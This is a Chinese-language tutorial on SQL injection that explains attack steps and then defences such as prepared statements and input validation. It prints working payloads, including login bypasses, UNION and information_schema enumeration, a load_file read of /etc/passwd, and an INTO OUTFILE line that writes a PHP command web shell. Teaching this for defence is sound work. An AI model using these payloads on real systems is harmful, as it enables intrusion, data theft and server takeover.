[TOC]

# 一、SQL注入简介
结构化查询语言( SQL)是一种用来和数据库交互的文本语言。SQL注入( SQL Injection )就是利用某些数据库的外部接口将用户数据插入到实际的数据库操作语言(SQL)当中，从而达到入侵数据库乃至操作系统的目的。它的产生主要是由于程序对用户输入的数据没有进行严格的过滤，导致非法数据库查询语句的执行。

SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。

SQL注入攻击具有很大的危害，攻击者可以利用它读取、修改或者删除数据库内的数据,获取数据库中的用户名和密码等敏感信息，甚至可以获得数据库管理员的权限，而且, SQL注入也很难防范。网站管理员无法通过安装系统补J或者进行简单的安全配置进行自我保护，一般的防火墙也无法拦截SQL注入攻击。
 1. 对于Web应用程序而已，用户核心数据存储在数据库中，例如Mysql，SQL Server，Oracle；
 2. 通过SQL注入攻击，可以获取、修改、删除数据库信息，并通过提权来控制Web服务器等其他操作；
 3. SQL注入即攻击者通过构造特殊的SQL语句，入侵目标系统，致使后台数据库泄露数据的过程；

**SQL注入危害**
 1. 拖库导致用户数据泄露；
 2. 危害Web等应用的安全；
 3. 失去操作系统的控制器；
 4. 用户信息被非法买卖；
 5. 危害企业及国家的安全！


## 1.1 SQL注入流程
 1. 判断是否有SQL注入漏洞；
 2. 判断操作系统、数据库和Web应用的类型；
 3. 获取数据库信息，包括管理员信息及拖库；
 4. 加密信息破解，sqlmap可自动破解；
 5. 提升权限，获得sql-shell、os-shell、登录应用后台。

```sql
# 原始语句
mysql> select first_name,last_name from test.user where user_id = ''

# SQL注入语句解析： ' or 1=1 --'
mysql> select first_name,last_name from test.user where user_id = ' 'or 1=1 -- '       '

# 说明
# 第一个' 用于闭合前面的条件
# or 1=1 为真的条件
# -- 将注释后面的所有语句
```

## 1.2 SQL注入的产生过程
### 1.2.1 构造动态字符串
参数化查询是指SQL语句中包含一个或多个嵌入参数的查询。可以在运行过程中将参数传递给这些查询。包含的嵌入到用户输入中的参数不会被解析成名命令而执行，而且代码不存在被注入的机会。
下列PHP代码展示了某些开发人员如何根据用户输入来动态构造SQL字符串语句。该语句从数据库的表中选择数据。
```php
//在PHP中动态构造SQL语句的字符串
$query = "select * from table where field = '$_GET[""input]'";
//在.NET中动态构造SQL语句的字符串
query = "select * from table where field = '" + request.getParameter("input") + " ' ";
```
像上面那样构造动态SQL语句的问题是：如果在将输入传递给动态创建的语句之前，未对代码进行验证或编码，那么鬼记者会将SQL语句作为输入提供给应用并将SQL语句传递给数据库加以执行。 下面是使用上述代码构造的SQL语句：
```sql
select * from table where field = 'input'
```
#### 转义字符处理不当
SQL数据库将单引号字符解析成代码与数据间的分界线：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均为数据。 单引号并不是唯一的转义字符：比如Oracle中，空格，双竖线(||)、逗号、点均具有特殊意义。例如：
```
--管道字符用于为一个值追加一个函数
--函数将被执行，函数的结果将转换并与前面的值连接
http://www.xxx.com/id=1 || utl_inaddr.get_host_address(local)--
--星号后跟一个正斜线，用于结束注释或Oracle中的优化提示
http://www.xxx.com/hint=*/ from dual-
在SAP MAX DB（SAP DB）中，开始定界符是由一个小于符号和一个感叹号组成的：
http://www.xxx.com/id=1 union select operating system from sysinfo.version--<!
```
#### 类型处理不当
处理数字数据时，不需要使用单引号将数字数据引起来，否则，数据数据会被当作字符串处理。 MYSQL 提供了一个名为LOAD_FILE的函数，它能够读取文件并将文件内容作为字符串返回。调用该函数的用户必须拥有FILE权限。
```sql
union all select load_file('/etc/passwd')--
MYSQL内置命令，使用该命令来创建系统文件并进行写操作。
union select "<? system($_request['cmd']); ?>" into outfile "/var/www/cmd.php" -
```
#### 查询语句组装不当
有时需要使用动态SQL语句对某些复杂的应用进行编码，因为在程序开发阶段不可能还不知道要查询的表或字段。

#### 错误处理不当
将详细的内部错误消息（如数据库转储、错误代码等）显示给用户或攻击者。
```sql
' and 1 in (select @@version) -
```
#### 多个提交处理不当
白名单是一种除了白名单中的字符外，禁止使用其他字符的技术。黑名单是一种除了黑名单中的字符外，其他字符均允许使用的技术。 多参数查询，多参数可能产生注入。

## 1.3 SQL盲注
有时不可能显示数据库的所有信息，但并不代表代码不会受到SQL注入攻击。
```sql
user' or '1'='1--- Invalid password
user' or '1'='1--- Invalid username or password
```
发现这种情况，可注入一个永假条件并检查返回值的差异，这对进一步核实username字段是否易受SQL注入攻击来说非常有用。
SQL盲住是一种SQL注入漏洞，攻击者可以操纵SQL语句，应用会针对真假条件返回不同的值。但是攻击者无法检索查询结果。

## 1.4 SQL注入例子
下面的用户登录验证程序就是SQL注入的例子：
 1. 创建用户表user
```sql
create table user(
userid int(11) not null auto_increment,
username varchar(20) not null default '',
password varchar(20) not null default '',
primary key (userid)
)type=MyISAM auto_increment=3 ;
```
 2. 给用户表user添加一条用户记录
```sql
insert into 'user' values (1,'ange1','mypass');
```
 3. 验证用户root登录localhost服务器

```PHP
<?php
	#servername = "localhost";
	$dbusername = "root";
	$dbpassword = "";
	$dbname = "injection";
	mysql_connect($severname,$dbusername,$dbpassword) or die ("数据库连接失败");
	$sql = "select * from user where username='$username' and password = '$password''";
	$result = mysql_db_query($dbname,$sql);
	$userinfo = mysql_fetch_array($result);
	if(empty($userinfo))
	{
	echo "登录失败";
	}else {
	echo "登录成功";
	}
	echo "<p> SQL Query:$sql <p>";
	?>
```
 4. 然后提交如下URL：
 `http://127.0.0.1/injection/user.php?username=ange1' or ' 1=1 `
结果发现，这个URL可以成功登录系统。
同样，也可以利用SQL的注释语句实现SQL注入，如：
`http://127.0.0.1/injection/user/php?username=angel '/*`
`http://127.0.0.1/injection/user.php?username=angel '#`

因为在SQL语句中，"/*"或者"#"都可以将后面的语句注释掉。这样上述语句就可以通过这两个注释符中任意一个将后面的语句给注释掉了，结果导致只根据用户名而没有密码的URL都成功进行了登录。

## 1.5 SQL UNION注入
UNION语句用于联合前面的select查询语句，合并查询更多信息；
一般通过错误和布尔注入确认注入点之后，便开始通过union语句来获取有效信息。

猜字段数：
```sql
mysql> select * from test.user union select 1;
mysql> select * from test.user union select 1,2;
mysql> select * from test.user union select 1,2,3;
mysql> select * from test.user union select 1,2,3,4;

mysql> select * from test.user union select user_id,user_name,1,2,3 from test.password;

# 获得当前数据库及用户信息
' union select version(),database() -- '
' union select user(),database() -- '
# 说明：
version() # 获得数据库版本信息
database() # 获得当前数据库名
user() # 获得当前用户名
```

## 1.6 information_schema
information_schema-查询数据库中所有表。
information_schema数据库是Mysql自带的，它提供了访问数据库元数据的方式；
元数据包括数据库名、表名、列数据类型、访问权限、字符集等基础信息。

查询所有库名
```sql
‘union select TABLE_SCHEMA,1 from INFORMATION_SCHEMA.tables --’
Mysql> select first_name,last_name from test.users where user_id=’’ union select table_schema,1 from information_schema.tables -- ‘’
```

查看库中所有表名
```sql
‘union select table_name,1 from information_schema.tables -- ‘
Mysql> select first_name,last_name from test.users where user_id = ‘ ‘ union select table_name, 1 from information_schema.tables -- ‘ ‘
````
同时查询表名及对应库名
```sql
‘union select table_schema,table_name from information_schema.tables --’
Mysql> select first_name,last_name from test.users where user_id= ‘ ‘ union select table_schema, table_name from information_schema.tables -- ‘’
```

查询数据库库名、表名 information_schema.tables
```sql
mysql> select * from information_schema.TABLES \G
mysql> select DISTINCT TABLE_SCHEMA from information_schema.TABLES; //等价于show databases
mysql> select TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES\G
mysql>select TABLE_SCHEMA,GROUP_CONCAT(TABLE_NAME) from information_schema.TABLES GROUP BY TABLE_SCHEMA\G
mysql> select TABLE_NAME from INFORMATION_SCHEMA.tables where TABLE_SCHEMA=’test’; //等价于show tables
```

查询数据库库名、表名、字段名information_schema.columns
```sql
mysql> select * from information_schema.columns\G
mysql> select column_name from information_schema.columns;
mysql> select column_name from information_schema.columns where table_schema = ‘test’ and table_name =’users’;
mysql> select column_name from information_schema.columns where table_name=’USER_PRIVILEGES’;
mysql> select column_name from information_schema.columns where table_name=’SCHEMA_PRIVILEGES’;
```



# 二、应用开发中可以采取的应对措施
## 2.1 PrepartStatement+Bind-Variable
MySQL服务器端并不存在共享池的概念，所以在Mysql上使用绑定变量（Bind Variable）最大的好处主要是为了避免SQL注入，增加安全性，以Java为例，同样是根据username来访问user表：
```sql
Class.forName("com.mysql.jdbc.Driver").nerInstance();
String connectionUrl = "jdbc:mysql://localhost:3306/test";
String connectionUser = "test_user";
String connectionPassword = "test_passwd";
conn = DriverManager.getConnection(connectionUrl,connectionUser,connectionPassword);
String sqlStmt = "select * from user where username = ? and password = ?";
prepStmt = conn.prepareStatement(sqlStmt);
prepStmt.setString(1,"angel' or 1=1'");
prepStmt.setString(2,"test");
rs = prepStmt.executeQuery();
while(rs.next()){
String name = rs.getString("username");
String job = rs.getString("password");
}
```
可以注意到，虽然传入的变量中带了“angel'or 1=1'”的条件，企图蒙混过关，但是由于使用了绑定变量( Java驱动中采用PreparedStatement 语句来实现),输入的参数中的单引号被正常转义，导致后续的"or 1=1"作为username条件的内容出现，而不会作为SQL的一个单独条件被解析，避免了SQL注入的风险。

同样的，在使用绑定变量的情况下，企图通过注释“/*” 或“#”让后续条件失效也是会失败的。

需要注意，PreparedStaterment 语句是由JDBC驱动来支持的，在使用PreparedStatement语句的时候，仅仅做了简单的替换和转义，并不是MySQL提供了PreparedStatement的特性。

## 2.2 使用应用程序提供的转换函数
很多应用程序接口都提供了对特殊字符进行转换的函数,恰当地使用这些函数，可以防止应用程序用户输入使应用程序生成不期望的语句。
 - MySQL CAPI:使用mysql real_ escape_ string() API调用。
 - MySQL++:使用escape和quote修饰符。
## 2.3 自定义函数进行校验
如果现有的转换函数仍然不能满足要求,则需要自己编写函数进行输入校验。输入验证是一个很复杂的问题。输入验证的途径可以分为以下几种:
 - 整理数据使之变得有效;
 - 拒绝已知的非法输入;
 - 只接受已知的合法输入。
因此，如果想要获得最好的安全状态，目前最好的解决办法就是,对用户提交或者可能改变的数据进行简单分类，分别应用正则表达式来对用户提供的输入数据进行严格的检测和验证。

下面采用正则表达式的方法提供一个验证函数：
`已知非法符号有:“”、“;”、“=”、“(”、“)”、“/*”、“*/”、“%”、 “+”、“”、“>”、“<”、“__”、“[”和“]”。`